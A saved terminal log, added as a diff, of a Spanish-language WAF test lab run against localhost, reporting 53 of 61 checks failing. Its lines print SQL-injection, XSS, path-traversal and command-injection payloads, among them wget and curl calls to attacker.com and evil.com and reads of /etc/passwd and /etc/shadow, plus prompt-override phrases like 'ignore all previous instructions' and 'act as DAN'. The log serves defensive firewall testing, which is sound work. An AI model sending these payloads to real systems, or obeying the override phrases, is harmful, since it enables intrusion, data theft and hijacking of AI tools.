@@ -1,0 +1,398 @@
+
+[1m[0;34m╔══════════════════════════════════════════════════════════════════════════╗[0m
+[1m[0;34m║              WAF QA LABORATORY — Pruebas de Seguridad                   ║[0m
+[1m[0;34m╚══════════════════════════════════════════════════════════════════════════╝[0m
+
+  [1;37mObjetivo:[0m   http://localhost:8000
+  [1;37mEndpoint:[0m   /
+  [1;37mInicio:[0m     2026-04-20 18:29:43
+  [1;37mLog:[0m        ./waf_lab_logs/waf_lab_20260420_182943.log
+
+[1;33m⏳ Verificando conectividad con el servidor...[0m
+[0;32m✅ Servidor respondiendo. HTTP 200[0m
+
+
+[0;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[0m
+[1m[0;36m  🗄️  CATEGORÍA 1: SQL INJECTION[0m
+
+[0;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[0m
+
+[1;33m→ Pruebas GET (parámetro ?q=)[0m
+
+  [0;31m❌ FAIL[0m [1;37mSQLi UNION SELECT clásico (GET)[0m
+     [0;37mPayload: ' UNION SELECT 1,2,3--[0m
+     [0;31mHTTP: 200 (esperado: 403)[0m
+[2026-04-20 18:29:43] FAIL | SQLi UNION SELECT clásico (GET) | HTTP 200 esperado 403 | ' UNION SELECT 1,2,3--
+  [0;31m❌ FAIL[0m [1;37mSQLi OR lógico (GET)[0m
+     [0;37mPayload: ' OR '1'='1[0m
+     [0;31mHTTP: 200 (esperado: 403)[0m
+[2026-04-20 18:29:44] FAIL | SQLi OR lógico (GET) | HTTP 200 esperado 403 | ' OR '1'='1
+  [0;31m❌ FAIL[0m [1;37mSQLi AND lógico (GET)[0m
+     [0;37mPayload: ' AND 'a'='a[0m
+     [0;31mHTTP: 200 (esperado: 403)[0m
+[2026-04-20 18:29:45] FAIL | SQLi AND lógico (GET) | HTTP 200 esperado 403 | ' AND 'a'='a
+  [0;31m❌ FAIL[0m [1;37mSQLi SLEEP blind (GET)[0m
+     [0;37mPayload: '; SLEEP(5)--[0m
+     [0;31mHTTP: 200 (esperado: 403)[0m
+[2026-04-20 18:29:45] FAIL | SQLi SLEEP blind (GET) | HTTP 200 esperado 403 | '; SLEEP(5)--
+  [0;31m❌ FAIL[0m [1;37mSQLi DROP TABLE (GET)[0m
+     [0;37mPayload: '; DROP TABLE users--[0m
+     [0;31mHTTP: 200 (esperado: 403)[0m
+[2026-04-20 18:29:46] FAIL | SQLi DROP TABLE (GET) | HTTP 200 esperado 403 | '; DROP TABLE users--
+  [0;31m❌ FAIL[0m [1;37mSQLi comentario inline (GET)[0m
+     [0;37mPayload: SEL/**/ECT * FROM users[0m
+     [0;31mHTTP: 200 (esperado: 403)[0m
+[2026-04-20 18:29:46] FAIL | SQLi comentario inline (GET) | HTTP 200 esperado 403 | SEL/**/ECT * FROM users
+  [0;31m❌ FAIL[0m [1;37mSQLi sin espacios con paréntesis (GET)[0m
+     [0;37mPayload: 'UNION(SELECT(1),(2),(3))[0m
+     [0;31mHTTP: 200 (esperado: 403)[0m
+[2026-04-20 18:29:47] FAIL | SQLi sin espacios con paréntesis (GET) | HTTP 200 esperado 403 | 'UNION(SELECT(1),(2),(3))
+  [0;31m❌ FAIL[0m [1;37mSQLi GROUP_CONCAT (GET)[0m
+     [0;37mPayload: ' UNION SELECT GROUP_CONCAT(user())--[0m
+     [0;31mHTTP: 200 (esperado: 403)[0m
+[2026-04-20 18:29:47] FAIL | SQLi GROUP_CONCAT (GET) | HTTP 200 esperado 403 | ' UNION SELECT GROUP_CONCAT(user())--
+  [0;31m❌ FAIL[0m [1;37mSQLi CHAR encoding (GET)[0m
+     [0;37mPayload: CHAR(83,69,76,69,67,84)[0m
+     [0;31mHTTP: 200 (esperado: 403)[0m
+[2026-04-20 18:29:48] FAIL | SQLi CHAR encoding (GET) | HTTP 200 esperado 403 | CHAR(83,69,76,69,67,84)
+  [0;31m❌ FAIL[0m [1;37mSQLi stacked query (GET)[0m
+     [0;37mPayload: 1; SELECT * FROM users[0m
+     [0;31mHTTP: 200 (esperado: 403)[0m
+[2026-04-20 18:29:48] FAIL | SQLi stacked query (GET) | HTTP 200 esperado 403 | 1; SELECT * FROM users
+
+[1;33m→ Pruebas POST (campo search)[0m
+
+  [0;31m❌ FAIL[0m [1;37mSQLi UNION SELECT clásico (POST)[0m
+     [0;37mPayload: ' UNION SELECT 1,2,3--[0m
+     [0;31mHTTP: 404 (esperado: 403)[0m
+[2026-04-20 18:29:49] FAIL | SQLi UNION SELECT clásico (POST) | HTTP 404 esperado 403 | ' UNION SELECT 1,2,3--
+  [0;31m❌ FAIL[0m [1;37mSQLi OR numérico (POST)[0m
+     [0;37mPayload: ' OR 1=1--[0m
+     [0;31mHTTP: 404 (esperado: 403)[0m
+[2026-04-20 18:29:50] FAIL | SQLi OR numérico (POST) | HTTP 404 esperado 403 | ' OR 1=1--
+  [0;31m❌ FAIL[0m [1;37mSQLi TRUNCATE TABLE (POST)[0m
+     [0;37mPayload: '; TRUNCATE TABLE users--[0m
+     [0;31mHTTP: 404 (esperado: 403)[0m
+[2026-04-20 18:29:50] FAIL | SQLi TRUNCATE TABLE (POST) | HTTP 404 esperado 403 | '; TRUNCATE TABLE users--
+  [0;31m❌ FAIL[0m [1;37mSQLi LOAD_FILE (POST)[0m
+     [0;37mPayload: ' UNION SELECT LOAD_FILE('/etc/passwd')--[0m
+     [0;31mHTTP: 404 (esperado: 403)[0m
+[2026-04-20 18:29:51] FAIL | SQLi LOAD_FILE (POST) | HTTP 404 esperado 403 | ' UNION SELECT LOAD_FILE('/etc/passwd')--
+
+[1;33m→ Pruebas de falsos positivos (NO deben bloquearse)[0m
+
+  [0;32m✅ PASS[0m [1;37mNombre normal (GET)[0m [0;37m(no bloqueado correctamente)[0m
+     [0;37mInput: Juan Garcia | HTTP: 200[0m
+[2026-04-20 18:29:51] PASS | Nombre normal (GET) | HTTP 200 | Juan Garcia
+  [0;32m✅ PASS[0m [1;37mEmail válido (GET)[0m [0;37m(no bloqueado correctamente)[0m
+     [0;37mInput: usuario@ejemplo.com | HTTP: 200[0m
+[2026-04-20 18:29:52] PASS | Email válido (GET) | HTTP 200 | usuario@ejemplo.com
+  [0;32m✅ PASS[0m [1;37mTexto con OR (GET)[0m [0;37m(no bloqueado correctamente)[0m
+     [0;37mInput: Rojo or azul son mis colores | HTTP: 200[0m
+[2026-04-20 18:29:52] PASS | Texto con OR (GET) | HTTP 200 | Rojo or azul son mis colores
+
+[0;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[0m
+[1m[0;36m  🔥 CATEGORÍA 2: CROSS-SITE SCRIPTING (XSS)[0m
+
+[0;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[0m
+
+[1;33m→ Pruebas GET[0m
+
+  [0;31m❌ FAIL[0m [1;37mXSS script tag clásico (GET)[0m
+     [0;37mPayload: <script>alert(1)</script>[0m
+     [0;31mHTTP: 200 (esperado: 403)[0m
+[2026-04-20 18:29:53] FAIL | XSS script tag clásico (GET) | HTTP 200 esperado 403 | <script>alert(1)</script>
+  [0;31m❌ FAIL[0m [1;37mXSS javascript: protocol (GET)[0m
+     [0;37mPayload: javascript:alert(1)[0m
+     [0;31mHTTP: 200 (esperado: 403)[0m
+[2026-04-20 18:29:53] FAIL | XSS javascript: protocol (GET) | HTTP 200 esperado 403 | javascript:alert(1)
+  [0;31m❌ FAIL[0m [1;37mXSS onerror event (GET)[0m
+     [0;37mPayload: <img src=x onerror=alert(1)>[0m
+     [0;31mHTTP: 200 (esperado: 403)[0m
+[2026-04-20 18:29:54] FAIL | XSS onerror event (GET) | HTTP 200 esperado 403 | <img src=x onerror=alert(1)>
+  [0;31m❌ FAIL[0m [1;37mXSS onload event (GET)[0m
+     [0;37mPayload: <body onload=alert(1)>[0m
+     [0;31mHTTP: 200 (esperado: 403)[0m
+[2026-04-20 18:29:55] FAIL | XSS onload event (GET) | HTTP 200 esperado 403 | <body onload=alert(1)>
+  [0;31m❌ FAIL[0m [1;37mXSS document.cookie (GET)[0m
+     [0;37mPayload: <script>document.cookie</script>[0m
+     [0;31mHTTP: 200 (esperado: 403)[0m
+[2026-04-20 18:29:55] FAIL | XSS document.cookie (GET) | HTTP 200 esperado 403 | <script>document.cookie</script>
+  [0;31m❌ FAIL[0m [1;37mXSS atributo onmouseover (GET)[0m
+     [0;37mPayload: " onmouseover=alert(1) "[0m
+     [0;31mHTTP: 200 (esperado: 403)[0m
+[2026-04-20 18:29:56] FAIL | XSS atributo onmouseover (GET) | HTTP 200 esperado 403 | " onmouseover=alert(1) "
+
+[1;33m→ Pruebas POST[0m
+
+  [0;31m❌ FAIL[0m [1;37mXSS script tag (POST)[0m
+     [0;37mPayload: <script>alert(1)</script>[0m
+     [0;31mHTTP: 404 (esperado: 403)[0m
+[2026-04-20 18:29:56] FAIL | XSS script tag (POST) | HTTP 404 esperado 403 | <script>alert(1)</script>
+  [0;31m❌ FAIL[0m [1;37mXSS script tag mayúsculas (POST)[0m
+     [0;37mPayload: <SCRIPT>alert(1)</SCRIPT>[0m
+     [0;31mHTTP: 404 (esperado: 403)[0m
+[2026-04-20 18:29:57] FAIL | XSS script tag mayúsculas (POST) | HTTP 404 esperado 403 | <SCRIPT>alert(1)</SCRIPT>
+  [0;31m❌ FAIL[0m [1;37mXSS confirm dialog (POST)[0m
+     [0;37mPayload: confirm('xss')[0m
+     [0;31mHTTP: 404 (esperado: 403)[0m
+[2026-04-20 18:29:57] FAIL | XSS confirm dialog (POST) | HTTP 404 esperado 403 | confirm('xss')
+
+[0;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[0m
+[1m[0;36m  📁 CATEGORÍA 3: PATH TRAVERSAL[0m
+
+[0;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[0m
+
+[1;33m→ Pruebas GET[0m
+
+  [0;31m❌ FAIL[0m [1;37mPath Traversal unix básico (GET)[0m
+     [0;37mPayload: ../../etc/passwd[0m
+     [0;31mHTTP: 200 (esperado: 403)[0m
+[2026-04-20 18:29:58] FAIL | Path Traversal unix básico (GET) | HTTP 200 esperado 403 | ../../etc/passwd
+  [0;31m❌ FAIL[0m [1;37mPath Traversal unix profundo (GET)[0m
+     [0;37mPayload: ../../../../../../../etc/shadow[0m
+     [0;31mHTTP: 200 (esperado: 403)[0m
+[2026-04-20 18:29:58] FAIL | Path Traversal unix profundo (GET) | HTTP 200 esperado 403 | ../../../../../../../etc/shadow
+  [0;31m❌ FAIL[0m [1;37mPath Traversal URL encoded (GET)[0m
+     [0;37mPayload: ..//../etc/passwd[0m
+     [0;31mHTTP: 200 (esperado: 403)[0m
+[2026-04-20 18:29:59] FAIL | Path Traversal URL encoded (GET) | HTTP 200 esperado 403 | ..//../etc/passwd
+  [0;31m❌ FAIL[0m [1;37mPath Traversal double encoded (GET)[0m
+     [0;37mPayload: ..%2F..%2Fetc%2Fpasswd[0m
+     [0;31mHTTP: 200 (esperado: 403)[0m
+[2026-04-20 18:30:00] FAIL | Path Traversal double encoded (GET) | HTTP 200 esperado 403 | ..%2F..%2Fetc%2Fpasswd
+  [0;31m❌ FAIL[0m [1;37mPath Traversal evasión con doble slash (GET)[0m
+     [0;37mPayload: ....//....//etc/passwd[0m
+     [0;31mHTTP: 200 (esperado: 403)[0m
+[2026-04-20 18:30:00] FAIL | Path Traversal evasión con doble slash (GET) | HTTP 200 esperado 403 | ....//....//etc/passwd
+
+[1;33m→ Pruebas POST[0m
+
+  [0;31m❌ FAIL[0m [1;37mPath Traversal unix (POST)[0m
+     [0;37mPayload: ../../etc/passwd[0m
+     [0;31mHTTP: 404 (esperado: 403)[0m
+[2026-04-20 18:30:01] FAIL | Path Traversal unix (POST) | HTTP 404 esperado 403 | ../../etc/passwd
+  [0;31m❌ FAIL[0m [1;37mPath Traversal windows (POST)[0m
+     [0;37mPayload: ..\..\windows\system32[0m
+     [0;31mHTTP: 404 (esperado: 403)[0m
+[2026-04-20 18:30:01] FAIL | Path Traversal windows (POST) | HTTP 404 esperado 403 | ..\..\windows\system32
+
+[1;33m→ Pruebas de falsos positivos[0m
+
+  [0;32m✅ PASS[0m [1;37mRuta normal sin traversal (GET)[0m [0;37m(no bloqueado correctamente)[0m
+     [0;37mInput: productos/categoria/ropa | HTTP: 200[0m
+[2026-04-20 18:30:02] PASS | Ruta normal sin traversal (GET) | HTTP 200 | productos/categoria/ropa
+
+[0;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[0m
+[1m[0;36m  💻 CATEGORÍA 4: COMMAND INJECTION[0m
+
+[0;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[0m
+
+[1;33m→ Pruebas GET[0m
+
+  [0;31m❌ FAIL[0m [1;37mCommand Injection cat con punto y coma (GET)[0m
+     [0;37mPayload: cat /etc/passwd;[0m
+     [0;31mHTTP: 200 (esperado: 403)[0m
+[2026-04-20 18:30:02] FAIL | Command Injection cat con punto y coma (GET) | HTTP 200 esperado 403 | cat /etc/passwd;
+  [0;31m❌ FAIL[0m [1;37mCommand Injection ls con pipe (GET)[0m
+     [0;37mPayload: ls -la | grep root[0m
+     [0;31mHTTP: 200 (esperado: 403)[0m
+[2026-04-20 18:30:03] FAIL | Command Injection ls con pipe (GET) | HTTP 200 esperado 403 | ls -la | grep root
+  [0;31m❌ FAIL[0m [1;37mCommand Injection backtick (GET)[0m
+     [0;37mPayload: whoami`[0m
+     [0;31mHTTP: 200 (esperado: 403)[0m
+[2026-04-20 18:30:03] FAIL | Command Injection backtick (GET) | HTTP 200 esperado 403 | whoami`
+  [0;31m❌ FAIL[0m [1;37mCommand Injection wget malicioso (GET)[0m
+     [0;37mPayload: wget http://attacker.com/malware.sh;[0m
+     [0;31mHTTP: 200 (esperado: 403)[0m
+[2026-04-20 18:30:04] FAIL | Command Injection wget malicioso (GET) | HTTP 200 esperado 403 | wget http://attacker.com/malware.sh;
+
+[1;33m→ Pruebas POST[0m
+
+  [0;31m❌ FAIL[0m [1;37mCommand Injection curl redirect (POST)[0m
+     [0;37mPayload: curl http://evil.com/shell.sh > /tmp/x[0m
+     [0;31mHTTP: 404 (esperado: 403)[0m
+[2026-04-20 18:30:05] FAIL | Command Injection curl redirect (POST) | HTTP 404 esperado 403 | curl http://evil.com/shell.sh > /tmp/x
+  [0;31m❌ FAIL[0m [1;37mCommand Injection rm (POST)[0m
+     [0;37mPayload: ; rm -rf /tmp/test[0m
+     [0;31mHTTP: 404 (esperado: 403)[0m
+[2026-04-20 18:30:05] FAIL | Command Injection rm (POST) | HTTP 404 esperado 403 | ; rm -rf /tmp/test
+
+[0;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[0m
+[1m[0;36m  🍯 CATEGORÍA 5: HONEYPOTS Y HERRAMIENTAS CONOCIDAS[0m
+
+[0;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[0m
+
+[1;33m→ Acceso a rutas honeypot[0m
+
+  [0;31m❌ FAIL[0m [1;37mHoneypot /.env[0m
+     [0;37mPayload: Acceso directo a .env[0m
+     [0;31mHTTP: 200 (esperado: 403)[0m
+[2026-04-20 18:30:06] FAIL | Honeypot /.env | HTTP 200 esperado 403 | Acceso directo a .env
+  [0;32m✅ PASS[0m [1;37mHoneypot /wp-admin[0m
+     [0;37mPayload: Acceso a panel WordPress[0m
+     [0;37mHTTP: 403 (esperado: 403)[0m
+[2026-04-20 18:30:06] PASS | Honeypot /wp-admin | HTTP 403 | Acceso a panel WordPress
+  [0;32m✅ PASS[0m [1;37mHoneypot /phpmyadmin[0m
+     [0;37mPayload: Acceso a phpMyAdmin[0m
+     [0;37mHTTP: 403 (esperado: 403)[0m
+[2026-04-20 18:30:07] PASS | Honeypot /phpmyadmin | HTTP 403 | Acceso a phpMyAdmin
+  [0;32m✅ PASS[0m [1;37mHoneypot /adminer[0m
+     [0;37mPayload: Acceso a Adminer[0m
+     [0;37mHTTP: 403 (esperado: 403)[0m
+[2026-04-20 18:30:07] PASS | Honeypot /adminer | HTTP 403 | Acceso a Adminer
+  [0;31m❌ FAIL[0m [1;37mHoneypot /.git/config[0m
+     [0;37mPayload: Exposición de repositorio git[0m
+     [0;31mHTTP: 200 (esperado: 403)[0m
+[2026-04-20 18:30:08] FAIL | Honeypot /.git/config | HTTP 200 esperado 403 | Exposición de repositorio git
+  [0;32m✅ PASS[0m [1;37mHoneypot /backup.sql[0m
+     [0;37mPayload: Archivo de backup SQL expuesto[0m
+     [0;37mHTTP: 403 (esperado: 403)[0m
+[2026-04-20 18:30:08] PASS | Honeypot /backup.sql | HTTP 403 | Archivo de backup SQL expuesto
+
+[1;33m→ User-Agents de herramientas conocidas[0m
+
+  [0;31m❌ FAIL[0m [1;37mUA sqlmap detectado[0m
+     [0;37mPayload: User-Agent: sqlmap/1.7.8[0m
+     [0;31mHTTP: 200 (esperado: 403)[0m
+[2026-04-20 18:30:09] FAIL | UA sqlmap detectado | HTTP 200 esperado 403 | User-Agent: sqlmap/1.7.8
+  [0;31m❌ FAIL[0m [1;37mUA Nikto detectado[0m
+     [0;37mPayload: User-Agent: Nikto/2.1.6[0m
+     [0;31mHTTP: 200 (esperado: 403)[0m
+[2026-04-20 18:30:10] FAIL | UA Nikto detectado | HTTP 200 esperado 403 | User-Agent: Nikto/2.1.6
+  [0;31m❌ FAIL[0m [1;37mUA python-requests (riesgo alto)[0m
+     [0;37mPayload: User-Agent: python-requests/2.28.0[0m
+     [0;31mHTTP: 200 (esperado: 403)[0m
+[2026-04-20 18:30:10] FAIL | UA python-requests (riesgo alto) | HTTP 200 esperado 403 | User-Agent: python-requests/2.28.0
+  [0;31m❌ FAIL[0m [1;37mUA curl detectado[0m
+     [0;37mPayload: User-Agent: curl/7.88.0[0m
+     [0;31mHTTP: 200 (esperado: 403)[0m
+[2026-04-20 18:30:11] FAIL | UA curl detectado | HTTP 200 esperado 403 | User-Agent: curl/7.88.0
+  [0;31m❌ FAIL[0m [1;37mUA Scrapy detectado[0m
+     [0;37mPayload: User-Agent: Scrapy/2.9.0[0m
+     [0;31mHTTP: 200 (esperado: 403)[0m
+[2026-04-20 18:30:11] FAIL | UA Scrapy detectado | HTTP 200 esperado 403 | User-Agent: Scrapy/2.9.0
+
+[1;33m→ Cabeceras de interceptores (Burp Suite, etc.)[0m
+
+  [0;31m❌ FAIL[0m [1;37mCabecera X-Burp-Test detectada[0m
+     [0;37mPayload: Header: X-Burp-Test: 1[0m
+     [0;31mHTTP: 302 (esperado: 403)[0m
+[2026-04-20 18:30:12] FAIL | Cabecera X-Burp-Test detectada | HTTP 302 esperado 403 | Header: X-Burp-Test: 1
+  [0;31m❌ FAIL[0m [1;37mCabecera X-Scanner detectada[0m
+     [0;37mPayload: Header: X-Scanner: nessus[0m
+     [0;31mHTTP: 302 (esperado: 403)[0m
+[2026-04-20 18:30:12] FAIL | Cabecera X-Scanner detectada | HTTP 302 esperado 403 | Header: X-Scanner: nessus
+
+[0;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[0m
+[1m[0;36m  🤖 CATEGORÍA 6: PROMPT INJECTION / AI PAYLOADS[0m
+
+[0;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[0m
+
+[1;33m→ Pruebas POST[0m
+
+  [0;31m❌ FAIL[0m [1;37mPrompt injection EN (POST)[0m
+     [0;37mPayload: ignore all previous instructions...[0m
+     [0;31mHTTP: 404 (esperado: 403)[0m
+[2026-04-20 18:30:13] FAIL | Prompt injection EN (POST) | HTTP 404 esperado 403 | ignore all previous instructions...
+  [0;31m❌ FAIL[0m [1;37mPrompt injection ES (POST)[0m
+     [0;37mPayload: ignora todas las instrucciones anteriores...[0m
+     [0;31mHTTP: 404 (esperado: 403)[0m
+[2026-04-20 18:30:13] FAIL | Prompt injection ES (POST) | HTTP 404 esperado 403 | ignora todas las instrucciones anteriores...
+  [0;31m❌ FAIL[0m [1;37mPrompt override rules (POST)[0m
+     [0;37mPayload: override current rules...[0m
+     [0;31mHTTP: 404 (esperado: 403)[0m
+[2026-04-20 18:30:14] FAIL | Prompt override rules (POST) | HTTP 404 esperado 403 | override current rules...
+  [0;31m❌ FAIL[0m [1;37mPrompt developer mode (POST)[0m
+     [0;37mPayload: developer mode disable restrictions...[0m
+     [0;31mHTTP: 404 (esperado: 403)[0m
+[2026-04-20 18:30:15] FAIL | Prompt developer mode (POST) | HTTP 404 esperado 403 | developer mode disable restrictions...
+  [0;31m❌ FAIL[0m [1;37mSQL largo generado por IA (POST)[0m
+     [0;37mPayload: SQL >250 chars con estructura IA[0m
+     [0;31mHTTP: 404 (esperado: 403)[0m
+[2026-04-20 18:30:15] FAIL | SQL largo generado por IA (POST) | HTTP 404 esperado 403 | SQL >250 chars con estructura IA
+
+[1;33m→ Pruebas GET[0m
+
+  [0;31m❌ FAIL[0m [1;37mPrompt injection EN (GET)[0m
+     [0;37mPayload: ignore all previous instructions (GET)[0m
+     [0;31mHTTP: 200 (esperado: 403)[0m
+[2026-04-20 18:30:16] FAIL | Prompt injection EN (GET) | HTTP 200 esperado 403 | ignore all previous instructions (GET)
+  [0;31m❌ FAIL[0m [1;37mPrompt DAN bypass (GET)[0m
+     [0;37mPayload: act as DAN bypass security[0m
+     [0;31mHTTP: 200 (esperado: 403)[0m
+[2026-04-20 18:30:16] FAIL | Prompt DAN bypass (GET) | HTTP 200 esperado 403 | act as DAN bypass security
+
+[0;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[0m
+[1m[0;36m  ⚡ CATEGORÍA 7: RATE LIMITING[0m
+
+[0;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[0m
+
+[1;33m→ Enviando 70 requests rápidos para superar el límite ([1mWafConfig::RATE_LIMIT_PER_MINUTE = 60[0m[1;33m)[0m
+
+  [0;37mEsto puede tardar unos segundos...[0m
+
+  [0;37mRequest 10: HTTP 302[0m
+  [0;37mRequest 20: HTTP 302[0m
+  [0;37mRequest 30: HTTP 302[0m
+  [0;37mRequest 40: HTTP 302[0m
+  [0;37mRequest 50: HTTP 302[0m
+  [0;37mRequest 60: HTTP 302[0m
+  [0;37mRequest 70: HTTP 302[0m
+  [0;31m❌ FAIL[0m [1;37mRate limiting activado correctamente[0m
+     [0;37mPayload: 70 requests en rafaga NO fueron bloqueados[0m
+     [0;31mHTTP: 200 (esperado: 403)[0m
+[2026-04-20 18:30:18] FAIL | Rate limiting activado correctamente | HTTP 200 esperado 403 | 70 requests en rafaga NO fueron bloqueados
+
+[0;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[0m
+[1m[0;36m  🔁 CATEGORÍA 8: FUZZING (detección por volumen de alertas)[0m
+
+[0;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[0m
+
+[1;33m→ Enviando múltiples payloads distintos para activar detección de fuzzing[0m
+  [0;37m(WafConfig::FUZZING_ALERT_THRESHOLD = 10 alertas en 2 minutos)[0m
+
+  [0;37mPayload 1: HTTP 000000[0m
+  [0;37mPayload 2: HTTP 200[0m
+  [0;37mPayload 3: HTTP 200[0m
+  [0;37mPayload 4: HTTP 200[0m
+  [0;37mPayload 5: HTTP 000000[0m
+  [0;37mPayload 6: HTTP 200[0m
+  [0;37mPayload 7: HTTP 200[0m
+  [0;37mPayload 8: HTTP 000000[0m
+  [0;37mPayload 9: HTTP 200[0m
+  [0;37mPayload 10: HTTP 000000[0m
+  [0;37mPayload 11: HTTP 000000[0m
+  [0;37mPayload 12: HTTP 200[0m
+  [1;33m⚠️  SKIP[0m Detección de fuzzing — necesita Redis activo y acumulación en DB
+
+[0;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[0m
+
+[1m[1;37m  RESUMEN FINAL[0m
+
+  [1;37mTotal de pruebas:[0m  61
+  [0;32m✅ Pasaron:[0m        8
+  [0;31m❌ Fallaron:[0m       53
+  [1;33m⚠️  Saltadas:[0m      1
+
+  [1m[0;31m🚨 RESULTADO: WAF CON PROBLEMAS CRÍTICOS (13%) — 53 pruebas fallidas[0m
+
+  [0;37mLog completo guardado en: ./waf_lab_logs/waf_lab_20260420_182943.log[0m
+
+
+[0;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[0m
+
+[1m[1;33m  ⚠️  ACCIONES RECOMENDADAS DESPUÉS DE LAS PRUEBAS[0m
+
+  [1;37m1.[0m Limpia los bloqueos generados por las pruebas en la DB:
+     [0;36mDELETE FROM waf_blocked_ips_szm WHERE reason LIKE '%test%' OR created_at > NOW() - INTERVAL 1 HOUR;[0m
+
+  [1;37m2.[0m Limpia los logs de ataque generados:
+     [0;36mDELETE FROM waf_attack_logs_szm WHERE created_at > NOW() - INTERVAL 1 HOUR;[0m
+
+  [1;37m3.[0m Si tu IP quedó bloqueada, límpiala con:
+     [0;36mDELETE FROM waf_blocked_ips_szm WHERE ip_address = 'TU_IP';[0m
+
+
+[0;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━[0m
+
